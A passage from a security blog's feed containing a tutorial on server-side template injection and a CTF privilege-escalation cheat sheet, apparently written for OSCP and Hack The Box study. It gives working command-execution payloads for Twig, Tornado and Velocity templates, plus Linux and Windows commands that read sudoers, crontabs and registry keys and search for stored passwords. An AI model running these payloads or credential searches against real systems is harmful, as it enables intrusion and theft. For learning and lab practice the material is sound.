cbf5fea7a21497e0b014e9b467a3b866e007e97f195a4a37e7b2465d26ffe824a958a90915bfb8311db4313adaac6f9274890f34cafa8a4aa35233eac07c4d6a36e1123ab2dea4692ea34d34a96d70c46a27d3aeeb79b71d48d6c989851ccad0eec3c0b331211b9a0e8c4750244712973024554c2255e75f97283165c5634bd87364a0b91d3ffb5dde6c75200ab42c256f931179ea6bd3c76fbdb6d1a9f95eceb2edc9b34080156daa56506db48f1632e75160a029ee47bfd97122fab7adc00270b29564305b6408de409accc0c1c2d8b88c17bfed1a12f6e6e57f66edb8d24f88d5509b5e893f0d407a3a411ae0697e33d609230fd7ae808f11925f2f239b9838023ac7f69bc3dede706ec16165ca5e5182842036f32af7451cead386f5200bef2c0b831217243c29f8f338dd35cf71fa10c37ac6036b85e1572a2622f51677a7fba037389968bb06b3360baddbaee8898539e75b5619f0741c6c66852bb4249d6ecaf184108ee2a7f482e82b594983117f06f008bde83ece4f5f686de20e87903fd0669dce541d65112c061efb900bca01cc21bbd087e5cc769bb169c6e023606b1e30c354aff90b9efdc3424954cf5872cb2c2b6cbea900b6559ee578fd5dc5c93bfba4dcc32f7559da20041cac715e6047f72533e1c15a74c655989db5012aea9d1107e1e1e501cfbbff203db4e657c3daccfd3ec494956d2125f65dbba76a3ddf98695d5360d6bd95dc73aa988fbd7b623e8a14884492c67df22ac415f6edc969fd50efd51ffd9c219badea82f71e90d65eaa4bb4352ea1361558872d20b1a895bad006a5094387de531064512836c5d95f0d683332e9da1e20b3bc0ea67927bb31ba5cb52d8a0243c0ab60253cefaff2f6ae31dba38bdd0e0c81661d1baebc31c19230bdd6bba7e8a685d7cdce14e556fd153a03f3fc1bbd067f34a67a4ef5fc1b10904c8803ce3bb5102f859db84ee7050fb8fae43fb83fd77e281d5cf2909f4c91b9246c3f8ec4cbd0d8423b2f7e63ad8d4a646b270ee0fa2e9aff462ef70ae6c5daee6c65dcf5ab5dc885f8505711cbdc8fa9e449e36f44862ae73a6a74f03e9b84c3da68b58f925ec7786f3aced6c7605869b7a8eaa361b6b649c1df6a1c3e61af7c4ec6f86463df56e03ac195461d7918208c24badf841b73bdae6bbc47054686ef6c8b146de729c3c509bd728185fb4632086740a8475338b0030267dd871f327ebf4e6a0f25e8e05d34bfbf5a5ba2f6a745e4fbe9813a0d3266a8fb07749c9100009fb5ec89346bb3e31ddc383f4b72b6060bd6b6abff80d6970ef24d9784877562a79a03523801350b9fbf33cb3ef1cba4f9a96e41320af3ffa5f1f055a45e524b536ce0f7dad304dbf3b1a987d4463fb58142c7438e80f4ca1b0e6834519263af1ce0116505fb785ca798141a828b51518366edbfe99186a0539f3c4c9cd017a6727c7bace339b874c3cb89b73ec166db9c3cd6a48e46b1db7ae08869c57f8388bbe934e1591d673264614afadeff536007bc770c86c59343e5f2538fb8632ab5e94f2e98dad0f9430b812ac06492af7914b68ee5d830cf101c810650e0e9c52b07048740944c58d09325aa44a058357e301def8890f3c1df0c8c6d74f1a47b0c1d6ad748cc9e908f0688dea1eb9801ae76c77cc3399372ab1fa89ab74532af08fb8b085f964021f2b18de3296c8a9187d14a6c7be4bab38520b02b8345c39ebbd6a9648b7a772a5895a2597f0c85355c2ed7ce00b9307653d700bb082eda0390e56bbf79733b2ec79e743ed83fc0ada8452d2999f483843507bd34d224827f48d85d5afc5a35655ab84426cd5fa23b788df6e4b9eaa5c81d439f7bf4dc5a716e2759f7531a47940431a05cc1cb88433e4b93c341570a75ba961a67055e9463652d0a81164a01349e30c42b31053e6cf155327f0a4cc1430d9ac74e87673bf4e2ffd34885ca45643b51986438b1c104909436eae32d74138367d475bc189fbdb8192de5bfd06583c2fd71a56dfac0a2b940b5a63ac6e45bbcce3974919ef3d403e5d8295b68fee4ec62a461ceec9a8a660a8d2bb8f30296548eaa07d9b57032f49cfb59b73ca6fb99f63ed9acc9c4ebc0a10d00ea68ee9afb7ab9edaf0b7cbda0c98bccf593fafde551d519161727fd9f2d916313d699bec7559ff0165aacb47236f39e257d3a71e9ebd57e1476c569ec3a4a5308c6ab5a3e7ba63ab3f5082fb35f976cb76c608d42fefd0cea69bfdbb53a428c1d1660173304dff5d61be5f3f688459db3a21865eeae6b6834394cd4f01b0a8bd9981aae565d269547403ddfe844a5db6274ad94599e7d37dddd312504f1d82f8955e2a2c45f4005598973e8e717d3f348a2d8bf7d81fbe860a71474b3ad9be7df6b4335c92fa64b2e2de409edcc2e9e7d2f5c49b03862413422c6b9bba1707a158a6de6331db74477a056e14db673fec461a347c247230bab191e401952937df98c38267a5672045a2126d633cae785aab308b85db06555a91d2ef7de9c4403483929fe12b76848853a8321d8c5be0841a2d3bdb17651e404b534cf79f3abb3839d5efb4dcca307ad4ab97d4d2bab5d9b68dc9128c5c9ab27641f178529c95cacbba8bda3317dfde2bd613814aac006dfd756e15d45fca8a370a944ee9f5f1fee346bc05c98ada4f9a81696f66d250c459165d2d3a06a71a8502e11eb7acd44425b27da73b7f77b8bb7a992361e4aa31600d7fe8ae74db5d6d3cedc7b66700233d0ac9c355741b5a3c63faf676a4ea717d94012963f76a0a3659444417aceb9aacec59dd464360234a779255dec3d19acd23863b0b4e0f91ec1b0c4ceb00701235a330002b2900e94a501d0b63e1729ea356e2bf5cb971bc7c14286d9b416b4be9373e05a19c4412ca680b61d6cd7af2a2477dc94e4197c45b9d51b559cd7515f07c349a2cd3336de7d4fdd1329b4c1cbe6e858d521ad4ae7d762454c7d6dca07479d749bb81bba637eec5ae85d93f3b8015e07d6da72b9d68c8bbb3d36627</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Finding and performing SSTI</title>
      <link href="2020/12/24/Finding%20and%20performing%20SSTI/"/>
      <url>2020/12/24/Finding%20and%20performing%20SSTI/</url>
      
        <content type="html"><![CDATA[<p>Web pages use template engines to render dynamic data . Improper sanitization of user input could lead to <code>Server Side Template Injection</code> . Unlike XSS , Template injection can be used to directly attack web servers’ internals and even get Remote Code Execution .  </p><a id="more"></a><blockquote><p>Template Injection can arise both through developer error, and through the intentional exposure of templates in an attempt to offer rich functionality, as commonly done by wikis, blogs, marketing applications and content management systems. Intentional template injection is such a common use-case that many template engines offer a ‘sandboxed’ mode for this express purpose. </p></blockquote><p>Template is a form of script that does more than just simple data binding . Since data structures are complex , templates provides some capabilities similar to programming . A common example is the template engine may allow to reach field from objects</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;user.firstName&#125;&#125; &#123;&#123;user.lastName&#125;&#125;!</span><br></pre></td></tr></table></figure><p>So the nested properties in the above statement will not be evaluated by the language but the template will do the method call , fetch the value and pass on to the program . In addition to the syntax being simple it also powerful enough to do more than data bindings .</p><p>If the engine allows the access of fields , we might be able to access interesting internal data structure . Internal data structure could have interesting state to override. They may expose powerful types.</p><p>If the engine allows function calls, we are coming to target function that read files, execute commands or access internal states of the application.</p><h3 id="Identifying-Template-Engine"><a href="#Identifying-Template-Engine" class="headerlink" title="Identifying Template Engine"></a>Identifying Template Engine</h3><p>The <a href="https://www.wappalyzer.com/">Wappalyzer</a> browser plugin will help narrow down the search by giving the tools and technologies used in the application . </p><p>Most common libraries are the following for following languages .</p><ul><li>C# (StringTemplate, ASPX which is used dynamically on Sharepoint)</li><li>Java (Velocity, Freemarker, Pebble, Thymeleaf and Jinjava)</li><li>PHP (Twig, Smarty, Dwoo, Volt, Blade, Plates, Mustache, Python, Jinja2, Tornado, mustache and String Template)</li><li>Go (text/template)</li></ul><p>This decision tree can help in determining what templating engine it is and if it is vulnerable and to what kind of payload</p><p><img src="/images/ssti.png" alt="decison-tree"></p><h3 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig (PHP)"></a>Twig (PHP)</h3><p>Twig syntax example :-</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123; var &#125;&#125;</span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure><p>Test if it is vulnerable using </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure><p>Twig has a variable _self which makes a few of the internal APISs publis . Below is a malicious payload that was created to take advantage of the <code>registerUndefinedFilterCallback</code> function. In the payload below the command <code>id</code> is executed returning the id from the current user.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Jinja2-Python"><a href="#Jinja2-Python" class="headerlink" title="Jinja2 (Python)"></a>Jinja2 (Python)</h3><p>Jinja2 syntax examples :-</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;String</span><br><span class="line">&#123;&#123; message &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;Accessing an attribute</span><br><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;Accessing an attribute (alternative)</span><br><span class="line">&#123;&#123; foo[&#39;bar&#39;] &#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Python metadata properties can be read from any Python object. Method calls are also not filtered. Accessing powerful operations such command execution is, however, not trivial.</p></blockquote><p>refer <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">here</a> for all jinja2 ssti</p><p>For example in the <a href="">Doctor HTB Box</a> the developer had left an archive page that directly took the title and put it between<br><img src="/images/ssti3.png" alt="code"><br>so we can try the test for jinja2 by doing a simple arithemetic operation and trying to escape it with <code>&#123;&#123;&#125;&#125;</code><br>these are the values we gave<br><img src="/images/ssti2.png" alt="ssti"><br>and this is the execution of the sum operation<br><img src="/images/ssti4.png" alt="sum"></p><p>One thing to note here is while we are performing SSTI , we will need to do a little information gathering by accessing the mro attribute of python . In the information gathering except to find all classes available and there index so they can be invoked . for more details of what i am taking about refer <a href="https://blog.nvisium.com/p255">here</a></p><h3 id="Tornado-Python"><a href="#Tornado-Python" class="headerlink" title="Tornado (Python)"></a>Tornado (Python)</h3><p>Tornado syntax examples :-</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;userName&#125;&#125;</span><br></pre></td></tr></table></figure><p>THis supports the import directive so in the exploitation we can directly use it to get os.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%import os%&#125;</span><br><span class="line">&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Velocity-Java"><a href="#Velocity-Java" class="headerlink" title="Velocity (Java)"></a>Velocity (Java)</h3><p>Velocity has variable assignment.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set( $foo &#x3D; &quot;bar&quot; )</span><br><span class="line"></span><br><span class="line">$foo</span><br></pre></td></tr></table></figure><p>This is used to access interestung types. Here is an example payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($x&#x3D;&#39;&#39;)##</span><br><span class="line">#set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;))##</span><br><span class="line">#set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;))##</span><br><span class="line">#set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;))##</span><br><span class="line"></span><br><span class="line">#set($ex&#x3D;$rt.getRuntime().exec(&#39;ls&#39;))##</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())##</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> METHODOLOGY </tag>
            
            <tag> OSCP </tag>
            
            <tag> WEB </tag>
            
            <tag> EXPLOIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Methodology - Privilege Escalation</title>
      <link href="2020/12/21/Privilege%20Escalation%20cheat%20sheet/"/>
      <url>2020/12/21/Privilege%20Escalation%20cheat%20sheet/</url>
      
        <content type="html"><![CDATA[<p>Devil is in the detail. He literally is , not kidding . Once limited shell is established on the system its a good idea to escalate privileges . Because why wont you ?</p><a id="more"></a><p>Its a good idea to get to know the system we are working with first .</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Enumeration-Script"><a href="#Enumeration-Script" class="headerlink" title="Enumeration Script"></a>Enumeration Script</h4><ul><li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li><li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPeas</a></li><li><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">Unix privsec</a></li><li><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py">Linprivchecker.py</a></li><li><a href="https://github.com/kevthehermit/pentest/blob/master/linux-enum-mod.sh">Linux enum mod</a></li><li><a href="https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh">Linux exploit suggester</a></li></ul><h4 id="Check-distribution-type-and-version"><a href="#Check-distribution-type-and-version" class="headerlink" title="Check distribution type and version"></a>Check distribution type and version</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/lsb-release      <span class="comment"># Debian based</span></span><br><span class="line">cat /etc/redhat-release   <span class="comment"># Redhat based</span></span><br></pre></td></tr></table></figure><h4 id="Check-kernel-version"><a href="#Check-kernel-version" class="headerlink" title="Check kernel version"></a>Check kernel version</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure><h4 id="Check-env"><a href="#Check-env" class="headerlink" title="Check env"></a>Check env</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure><h4 id="Check-what-ports-are-listening-from-inside"><a href="#Check-what-ports-are-listening-from-inside" class="headerlink" title="Check what ports are listening from inside"></a>Check what ports are listening from inside</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulpn </span><br></pre></td></tr></table></figure><h4 id="Check-services-running-owned-by-root"><a href="#Check-services-running-owned-by-root" class="headerlink" title="Check services running owned by root"></a>Check services running owned by root</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure><h4 id="Check-information-about-applications-installed"><a href="#Check-information-about-applications-installed" class="headerlink" title="Check information about applications installed"></a>Check information about applications installed</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archivesO</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure><h4 id="Check-what-jobs-are-scheduled"><a href="#Check-what-jobs-are-scheduled" class="headerlink" title="Check what jobs are scheduled"></a>Check what jobs are scheduled</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><h4 id="Try-to-listen-to-live-traffic"><a href="#Try-to-listen-to-live-traffic" class="headerlink" title="Try to listen to live traffic"></a>Try to listen to live traffic</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</span><br></pre></td></tr></table></figure><h4 id="Self-exploration"><a href="#Self-exploration" class="headerlink" title="Self exploration"></a>Self exploration</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd | cut -d: -f1    <span class="comment"># List of users</span></span><br><span class="line">grep -v -E <span class="string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>   <span class="comment"># List of super users</span></span><br><span class="line">awk -F: <span class="string">&#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27;</span> /etc/passwd   <span class="comment"># List of super users</span></span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h4 id="Find-Suid-Guid-misconfiguration-and-exploit"><a href="#Find-Suid-Guid-misconfiguration-and-exploit" class="headerlink" title="Find Suid , Guid misconfiguration and exploit"></a>Find Suid , Guid misconfiguration and exploit</h4><p>When a binary has an suid bit attached to it , it runs an another user which could be root if root’s the owner .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Find SUID</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#Find GUID</span></span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>Check <a href="https://gtfobins.github.io/">GTFOBins</a> for all SUID exploit ways</p><h4 id="Abuse-sudo-rights"><a href="#Abuse-sudo-rights" class="headerlink" title="Abuse sudo rights"></a>Abuse sudo rights</h4><blockquote><p>Im case we have a restricted shell that has access to some programs using sudo we might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if we have sudo-rights to <code>cp</code> you can overwrite <code>/etc/shadow</code> or <code>/etc/sudoers</code> with your own malicious file.</p></blockquote><p>check for any such available binaries and again refer the amazing <a href="https://gtfobins.github.io/">GTFOBins</a></p><h4 id="World-writable-scripts-onwed-by-root"><a href="#World-writable-scripts-onwed-by-root" class="headerlink" title="World writable scripts onwed by root"></a>World writable scripts onwed by root</h4><blockquote><p>If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#World writable files directories</span></span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line">find / -perm -222 -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line">find / -perm -o w -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># World executable folder</span></span><br><span class="line">find / -perm -o x -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># World writable and executable folders</span></span><br><span class="line">find / \( -perm -o w -perm -o x \) -<span class="built_in">type</span> d 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="Self-exploration-1"><a href="#Self-exploration-1" class="headerlink" title="Self exploration"></a>Self exploration</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Basics</span></span><br><span class="line">systeminfo</span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># Who am I?</span></span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">echo</span> %username%</span><br><span class="line"></span><br><span class="line"><span class="comment"># What users/localgroups are on the machine?</span></span><br><span class="line">net users</span><br><span class="line">net localgroups</span><br><span class="line"></span><br><span class="line"><span class="comment"># More info about a specific user. Check if user has privileges.</span></span><br><span class="line">net user user1</span><br><span class="line"></span><br><span class="line"><span class="comment"># View Domain Groups</span></span><br><span class="line">net <span class="built_in">group</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># View Members of Domain Group</span></span><br><span class="line">net <span class="built_in">group</span> /domain &lt;<span class="built_in">Group</span> Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Firewall</span></span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line"><span class="comment"># Network</span></span><br><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp <span class="literal">-A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># How well patched is the system?</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h4 id="Look-for-passwords"><a href="#Look-for-passwords" class="headerlink" title="Look for passwords"></a>Look for passwords</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">findstr /<span class="built_in">si</span> password *.txt</span><br><span class="line">findstr /<span class="built_in">si</span> password *.xml</span><br><span class="line">findstr /<span class="built_in">si</span> password *.ini</span><br><span class="line"></span><br><span class="line"><span class="comment">#Find all those strings in config files.</span></span><br><span class="line"><span class="built_in">dir</span> /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find all passwords in all files.</span></span><br><span class="line">findstr /spin <span class="string">&quot;password&quot;</span> *.*</span><br><span class="line">findstr /spin <span class="string">&quot;password&quot;</span> *.*</span><br></pre></td></tr></table></figure><h4 id="Look-for-passwords-in-files"><a href="#Look-for-passwords-in-files" class="headerlink" title="Look for passwords in files"></a>Look for passwords in files</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">c:\unattend.xml</span><br><span class="line">%WINDIR%\Panther\Unattend\Unattended.xml</span><br><span class="line">%WINDIR%\Panther\Unattended.xml</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> c:\*vnc.ini /s /b</span><br><span class="line"><span class="built_in">dir</span> c:\*ultravnc.ini /s /b </span><br><span class="line"><span class="built_in">dir</span> c:\ /s /b | findstr /<span class="built_in">si</span> *vnc.ini</span><br></pre></td></tr></table></figure><p>sometimes might be base64 encoded .</p><h4 id="Look-for-passwords-in-registry"><a href="#Look-for-passwords-in-registry" class="headerlink" title="Look for passwords in registry"></a>Look for passwords in registry</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VNC</span></span><br><span class="line">reg query <span class="string">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows autologin</span></span><br><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SNMP Paramters</span></span><br><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Putty</span></span><br><span class="line">reg query <span class="string">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Search for password in registry</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h4 id="Check-for-services-only-available-from-inside"><a href="#Check-for-services-only-available-from-inside" class="headerlink" title="Check for services only available from inside"></a>Check for services only available from inside</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span></span><br></pre></td></tr></table></figure><h4 id="Kernel-exploits"><a href="#Kernel-exploits" class="headerlink" title="Kernel exploits"></a>Kernel exploits</h4><p><a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> to fnd missing software patches. Can also identify hotfixes/patches using :-</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h4 id="Find-scheduled-tasks"><a href="#Find-scheduled-tasks" class="headerlink" title="Find scheduled tasks"></a>Find scheduled tasks</h4><p>Look for scheduled tasks that are run as privileged user and runs a binary we can overwrite .</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"><span class="built_in">cat</span> schtask.txt | grep <span class="string">&quot;SYSTEM\|Task To Run&quot;</span> | grep <span class="literal">-B</span> <span class="number">1</span> SYSTEM</span><br></pre></td></tr></table></figure><p><em>Second command in linux</em></p><h4 id="Change-the-upnp-service-binary"><a href="#Change-the-upnp-service-binary" class="headerlink" title="Change the upnp service binary"></a>Change the upnp service binary</h4><figure class="highlight powershell"><table><tr><td 